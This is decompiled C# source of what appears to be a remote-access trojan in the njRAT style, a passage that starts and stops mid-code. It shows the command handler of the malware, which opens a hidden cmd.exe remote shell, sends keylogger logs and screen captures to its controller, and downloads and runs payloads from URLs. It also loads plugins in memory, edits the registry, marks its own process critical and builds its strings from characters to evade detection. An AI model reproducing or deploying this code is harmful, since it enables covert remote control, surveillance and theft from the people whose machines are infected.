					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardOutput", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardInput", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "FileName", new object[1] { new char[7] { 'c', 'm', 'd', '.', 'e', 'x', 'e' } }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
					((Process)Pro).OutputDataReceived += RS;
					((Process)Pro).ErrorDataReceived += RS;
					((Process)Pro).Exited += delegate
					{
						this.ex();
					};
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "UseShellExecute", new object[1] { false }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateNoWindow", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Pro, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSet(Pro, (Type)null, "EnableRaisingEvents", new object[1] { true }, (string[])null, (Type[])null);
					Send(new string(new char[3] { 'r', 's', 's' }));
					NewLateBinding.LateCall(Pro, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(Pro, (Type)null, "BeginErrorReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(Pro, (Type)null, "BeginOutputReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'r', 's' }), false) == 0)
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(Pro, (Type)null, "StandardInput", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WriteLine", new object[1] { DEB(ref array[1]) }, (string[])null, (Type[])null, (bool[])null, true);
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'r', 's', 'c' }), false) == 0)
				{
					try
					{
						NewLateBinding.LateCall(Pro, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					Pro = null;
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'k', 'l' }), false) == 0)
				{
					Send(new string(new char[2] { 'k', 'l' }) + Y + ENB(ref kq.Logs));
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'i', 'n', 'f' }), false) == 0)
				{
					string text2 = new string(new char[3] { 'i', 'n', 'f' }) + Y;
					if (Operators.CompareString(GTV("vn"), "", false) == 0)
					{
						string text3 = text2;
						string s = DEB(ref VN) + new string(new char[1] { '_' }) + HWD();
						text2 = text3 + ENB(ref s) + Y;
					}
					else
					{
						string text4 = text2;
						string s = GTV("vn");
						string s2 = DEB(ref s) + "_" + HWD();
						text2 = text4 + ENB(ref s2) + Y;
					}
					text2 = text2 + H + new string(new char[1] { ':' }) + P + Y;
					text2 = text2 + DR + Y;
					text2 = text2 + EXE + Y;
					text2 += Process.GetCurrentProcess().ProcessName;
					Send(text2);
				}
				else if (Operators.CompareString(text, new string(new char[4] { 'p', 'r', 'o', 'f' }), false) == 0)
				{
					string text5 = array[1];
					if (Operators.CompareString(text5, new string(new char[1] { '~' }), false) == 0)
					{
						STV(array[2], array[3]);
					}
					else if (Operators.CompareString(text5, new string(new char[1] { '!' }), false) == 0)
					{
						STV(array[2], array[3]);
						Send(new string(new char[8] { 'g', 'e', 't', 'v', 'a', 'l', 'u', 'e' }) + Y + array[1] + Y + GTV(array[1]));
					}
					else if (Operators.CompareString(text5, new string(new char[1] { '~' }), false) == 0)
					{
						DLV(array[2]);
					}
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'r', 'n' }), false) == 0)
				{
					byte[] array2 = null;
					if (!array[2].ToLower().StartsWith(new string(new char[4] { 'h', 't', 't', 'p' })))
					{
						byte[] b2 = Convert.FromBase64String(array[2]);
						bool CM = false;
						array2 = ZIP(b2, ref CM);
					}
					else
					{
						object obj = new WebClient();
						object[] array3 = new object[1];
						object[] array4 = array3;
						int num = 2;
						array4[0] = array[2];
						object[] array5 = array3;
						object[] array6 = array5;
						bool[] array7 = new bool[1] { true };
						object obj2 = NewLateBinding.LateGet(obj, (Type)null, "DownloadData", array6, (string[])null, (Type[])null, array7);
						if (array7[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
						}
						array2 = (byte[])obj2;
					}
					Send(new string(new char[3] { 'b', 'l', 'a' }));
					string text6 = Interaction.Environ("temp") + "\\" + RN(10) + "." + array[1];
					File.WriteAllBytes(text6, array2);
					Process.Start(text6);
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'i', 'n', 'v' }), false) == 0)
				{
					Send(new string(new char[3] { 'b', 'l', 'a' }));
					string text7 = GTV(array[1]);
					byte[] array8;
					if (text7.Length > 0)
					{
						array8 = Convert.FromBase64String(text7);
						Send(new string(new char[2] { 'p', 'l' }) + Y + array[1] + Y + Conversions.ToString(0));
					}
					else
					{
						if (array[3].Length == 1)
						{
							Send("pl" + Y + array[1] + Y + "False");
							return;
						}
						byte[] b3 = Convert.FromBase64String(array[3]);
						bool CM = false;
						array8 = ZIP(b3, ref CM);
						if (Conversions.ToBoolean(STV(array[1], Convert.ToBase64String(array8))))
						{
							Send(new string(new char[2] { 'p', 'l' }) + Y + array[1] + Y + Conversions.ToString(0));
						}
					}
					object objectValue = RuntimeHelpers.GetObjectValue(Plugin(array8, new string(new char[1] { 'A' })));
					NewLateBinding.LateSet(objectValue, (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(!Cn), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(objectValue, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'r', 'e', 't' }), false) == 0)
				{
					Send(new string(new char[3] { 'b', 'l', 'a' }));
					string text8 = GTV(array[1]);
					byte[] array9;
					if (text8.Length > 0)
					{
						array9 = Convert.FromBase64String(text8);
						Send(new string(new char[2] { 'p', 'l' }) + Y + array[1] + Y + Conversions.ToString(0));
					}
					else
					{
						if (array[2].Length == 1)
						{
							Send("pl" + Y + array[1] + Y + "True");
							return;
						}
						byte[] b4 = Convert.FromBase64String(array[2]);
						bool CM = false;
						array9 = ZIP(b4, ref CM);
						if (Conversions.ToBoolean(STV(array[1], Convert.ToBase64String(array9))))
						{
							Send(new string(new char[2] { 'p', 'l' }) + Y + array[1] + Y + Conversions.ToString(0));
						}
					}
					object objectValue2 = RuntimeHelpers.GetObjectValue(Plugin(array9, new string(new char[1] { 'A' })));
					string[] array10 = new string[5]
					{
						new string(new char[3] { 'r', 'e', 't' }),
						Y,
						array[1],
						Y,
						null
					};
					string[] array11 = array10;
					string s2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
					array11[4] = ENB(ref s2);
					Send(string.Concat(array10));
				}
				else if (Operators.CompareString(text, new string(new char[3] { 'C', 'A', 'P' }), false) == 0)
				{
					int width = Screen.get_PrimaryScreen().get_Bounds().Width;
					Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(width, rectangle.Height);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						Cursor @default = Cursors.get_Default();
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						rectangle = new Rectangle(position, size);
						@default.Draw(val2, rectangle);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					val2.Dispose();
					MemoryStream memoryStream = new MemoryStream();
					string s2 = new string(new char[3] { 'C', 'A', 'P' }) + Y;
					b = SB(ref s2);
					memoryStream.Write(b, 0, b.Length);
					MemoryStream memoryStream2 = new MemoryStream();
					IntPtr intPtr = default(IntPtr);
					((Image)val).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
					memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
					Send(memoryStream.ToArray());
					memoryStream.Dispose();
					memoryStream2.Dispose();
					((Image)val).Dispose();
				}
				else if (Operators.CompareString(text, new string(new char[1] { 'P' }), false) == 0)
				{
					Send(new string(new char[1] { 'P' }));
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'u', 'n' }), false) == 0)
				{
					string text9 = array[1];
					if (Operators.CompareString(text9, new string(new char[1] { '~' }), false) == 0)
					{
						UNS();
					}
					else if (Operators.CompareString(text9, new string(new char[1] { '!' }), false) == 0)
					{
						pr(0);
						ProjectData.EndApp();
					}
					else if (Operators.CompareString(text9, new string(new char[1] { '@' }), false) == 0)
					{
						pr(0);
						Type typeFromHandle = typeof(Process);
						object[] array5 = new object[1];
						object[] array12 = array5;
						object lO = LO;
						array12[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null));
						object[] array3 = array5;
						object[] array13 = array3;
						bool[] array7 = new bool[1] { true };
						NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array13, (string[])null, (Type[])null, array7, true);
						if (array7[0])
						{
							NewLateBinding.LateSetComplex(lO, (Type)null, "FullName", new object[1] { RuntimeHelpers.GetObjectValue(array3[0]) }, (string[])null, (Type[])null, true, false);
						}
						ProjectData.EndApp();
					}
				}
				else if (Operators.CompareString(text, new string(new char[2] { 'u', 'p' }), false) == 0)
				{
					byte[] array14 = null;
					if (!array[1].ToLower().StartsWith(new string(new char[4] { 'h', 't', 't', 'p' })))
					{
						byte[] b5 = Convert.FromBase64String(array[1]);
						bool CM = false;
						array14 = ZIP(b5, ref CM);
					}
					else
					{
						object obj3 = new WebClient();
						object[] array15 = new object[1];
						object[] array16 = array15;
						int num = 1;
						array16[0] = array[1];
						object[] array5 = array15;
						object[] array17 = array5;
						bool[] array7 = new bool[1] { true };
						object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "DownloadData", array17, (string[])null, (Type[])null, array7);
						if (array7[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
						}
						array14 = (byte[])obj4;
					}
					Send(new string(new char[3] { 'b', 'l', 'a' }));
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "" }, (string[])null, (Type[])null, (bool[])null, true);
					string text10 = Interaction.Environ("temp") + "\\" + RN(10) + ".exe";
					File.WriteAllBytes(text10, array14);
					Process.Start(text10, new string(new char[3] { 'U', 'P', ':' }) + Conversions.ToString(Process.GetCurrentProcess().Id));
					int num2 = 0;
					do
					{
						Thread.Sleep(10);
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValue", new object[2] { "di", "" }, (string[])null, (Type[])null, (bool[])null), (object)"!", false))
						{
							UNS();
						}
						num2++;
					}
					while (num2 <= 500);
				}
				else
				{
					if (Operators.CompareString(text, new string(new char[2] { 'R', 'G' }), false) != 0)
					{
						return;
					}
					object key = GetKey(array[2]);
					string text11 = array[1];
					if (Operators.CompareString(text11, new string(new char[1] { '~' }), false) == 0)
					{
						string text12 = "RG" + Y + "~" + Y + array[2] + Y;
						string text13 = "";
						IEnumerator enumerator = default(IEnumerator);
						try
						{
							enumerator = ((IEnumerable)NewLateBinding.LateGet(key, (Type)null, "GetSubKeyNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator.MoveNext())
							{
								string text14 = Conversions.ToString(enumerator.Current);
								if (!text14.Contains(new string(new char[1] { '\\' })))
								{
									text13 = text13 + text14 + Y;
								}
							}
						}
						finally
						{
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						IEnumerator enumerator2 = default(IEnumerator);
						try
						{
							enumerator2 = ((IEnumerable)NewLateBinding.LateGet(key, (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
							while (enumerator2.MoveNext())
							{
								string text15 = Conversions.ToString(enumerator2.Current);
								string[] array10 = new string[7] { text13, text15, "/", null, null, null, null };
								string[] array18 = array10;
								object[] array19 = new object[1] { text15 };
								object[] array20 = array19;
								bool[] array21 = new bool[1] { true };
								object obj5 = NewLateBinding.LateGet(key, (Type)null, "GetValueKind", array20, (string[])null, (Type[])null, array21);
								if (array21[0])
								{
									text15 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array19[0]), typeof(string));
								}
								array18[3] = obj5.ToString();
								array10[4] = "/";
								string[] array22 = array10;
								object[] array5 = new object[2] { text15, "" };
								object[] array23 = array5;
								bool[] array7 = new bool[2] { true, false };
								object obj6 = NewLateBinding.LateGet(key, (Type)null, "GetValue", array23, (string[])null, (Type[])null, array7);
								if (array7[0])
								{
									text15 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
								}
								array22[5] = obj6.ToString();
								array10[6] = Y;
								text13 = string.Concat(array10);
							}
						}
						finally
						{
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						Send(text12 + text13);
					}
					else if (Operators.CompareString(text11, new string(new char[1] { '!' }), false) == 0)
					{
						object[] array19 = new object[3];
						object[] array24 = array19;
						int num = 3;
						array24[0] = array[3];
						object[] array25 = array19;
						int num3 = 4;
						array25[1] = array[4];
						object[] array26 = array19;
						int num4 = 5;
						array26[2] = array[5];
						object[] array15 = array19;
						object[] array27 = array15;
						bool[] array21 = new bool[3] { true, true, true };
						NewLateBinding.LateCall(key, (Type)null, "SetValue", array27, (string[])null, (Type[])null, array21, true);
						if (array21[0])
						{
							array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
						if (array21[1])
						{
							array[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
						}
						if (array21[2])
						{
							array[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[2]), typeof(string));
						}
					}
					else if (Operators.CompareString(text11, new string(new char[1] { '@' }), false) == 0)
					{
						object[] array19 = new object[2];
						object[] array28 = array19;
						int num4 = 3;
						array28[0] = array[3];
						array19[1] = false;
						object[] array15 = array19;
						object[] array29 = array15;
						bool[] array21 = new bool[2] { true, false };
						NewLateBinding.LateCall(key, (Type)null, "DeleteValue", array29, (string[])null, (Type[])null, array21, true);
						if (array21[0])
						{
							array[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
					}
					else if (Operators.CompareString(text11, new string(new char[1] { '#' }), false) == 0)
					{
						object[] array19 = new object[1];
						object[] array30 = array19;
						int num4 = 3;
						array30[0] = array[3];
						object[] array15 = array19;
						object[] array31 = array15;
						bool[] array21 = new bool[1] { true };
						NewLateBinding.LateCall(key, (Type)null, "CreateSubKey", array31, (string[])null, (Type[])null, array21, true);
						if (array21[0])
						{
							array[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
					}
					else if (Operators.CompareString(text11, new string(new char[1] { '$' }), false) == 0)
					{
						object[] array19 = new object[1];
						object[] array32 = array19;
						int num4 = 3;
						array32[0] = array[3];
						object[] array15 = array19;
						object[] array33 = array15;
						bool[] array21 = new bool[1] { true };
						NewLateBinding.LateCall(key, (Type)null, "DeleteSubKeyTree", array33, (string[])null, (Type[])null, array21, true);
						if (array21[0])
						{
							array[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				try
				{
					Send(new string(new char[2] { 'E', 'R' }) + Y + array[0] + Y + ex2.Message);
					if ((Operators.CompareString(array[0], "up", false) == 0) | (Operators.CompareString(array[0], "rn", false) == 0))
					{
						Send(new string(new char[3] { 'b', 'l', 'a' }));
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public RegistryKey GetKey(string key)
	{
		if (key.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = key.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { text, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return (RegistryKey)obj2;
		}
		if (key.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = key.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array5 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array5, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj4;
		}
		if (key.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = key.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array6 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj6 = NewLateBinding.LateGet(obj5, (Type)null, "OpenSubKey", array6, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj6;
		}
		if (key.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = key.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj7 = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array4 = new object[2] { text, true };
			object[] array7 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj8 = NewLateBinding.LateGet(obj7, (Type)null, "OpenSubKey", array7, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj8;
		}
		return null;
	}

	public void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Send(byte[] b)
	{
		if (!Cn)
		{
			return;
		}
		try
		{
			object obj = new MemoryStream();
			object[] array = new object[3] { b, 0, b.Length };
			object[] array2 = array;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			NewLateBinding.LateCall(obj, (Type)null, "Write", new object[3]
			{
				SB(ref SPL),
				0,
				SPL.Length
			}, (string[])null, (Type[])null, (bool[])null, true);
			object obj2 = NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
			array = new object[4];
			object[] array4 = array;
			object obj3 = obj;
			array4[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
			array[1] = 0;
			object[] array5 = array;
			object obj4 = obj;
			array5[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null));
			array[3] = SocketFlags.None;
			object[] array6 = array;
			object[] array7 = array6;
			array3 = new bool[4] { true, false, true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "Send", array7, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				NewLateBinding.LateSetComplex(obj3, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array6[0]) }, (string[])null, (Type[])null, true, false);
			}
			if (array3[2])
			{
				NewLateBinding.LateSetComplex(obj4, (Type)null, "Length", new object[1] { RuntimeHelpers.GetObjectValue(array6[2]) }, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Cn = false;
			ProjectData.ClearProjectError();
		}
	}

	public void Send(string S)
	{
		Send(SB(ref S));
	}

	public void RC()
	{
		object obj = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				try
				{
					if (C != null && !Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Connected", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false) && Cn)
					{
						num++;
						if (num <= 500)
						{
							goto IL_0154;
						}
						num = 0;
						if (!Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Poll", new object[2]
						{
							-1,
							SelectMode.SelectRead
						}, (string[])null, (Type[])null, (bool[])null), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
						{
							goto IL_0154;
						}
					}
					goto end_IL_000c;
					IL_0154:
					if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(C, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))
					{
						byte[] array = new byte[Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(C, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)) + 1];
						object obj2 = NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array2 = new object[4]
						{
							array,
							0,
							array.Length,
							SocketFlags.None
						};
						object[] array3 = array2;
						bool[] array4 = new bool[4] { true, false, false, false };
						NewLateBinding.LateCall(obj2, (Type)null, "Receive", array3, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
						}
						object obj3 = obj;
						object[] array5 = new object[3] { array, 0, array.Length };
						object[] array6 = array5;
						array4 = new bool[3] { true, false, false };
						NewLateBinding.LateCall(obj3, (Type)null, "Write", array6, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
						}
						while (true)
						{
							object obj4 = obj;
							byte[] B = (byte[])NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
							string text = BS(ref B);
							NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { B }, (string[])null, (Type[])null, true, false);
							if (text.Contains(SPL))
							{
								Array array7 = fx((byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null), SPL);
								Thread thread = new Thread(delegate(object a0)
								{
									Ind((byte[])a0);
								});
								thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array7, new object[1] { 0 }, (string[])null)));
								NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
								obj = new MemoryStream();
								if (array7.Length == 2)
								{
									object obj5 = obj;
									object[] array8 = new object[3];
									array5 = new object[1];
									object[] array9 = array5;
									int num2 = 1;
									array9[0] = 1;
									array8[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array7, array5, (string[])null));
									array8[1] = 0;
									object[] array10 = new object[1];
									array2 = array10;
									object[] array11 = array2;
									int num3 = 0;
									obj4 = 1;
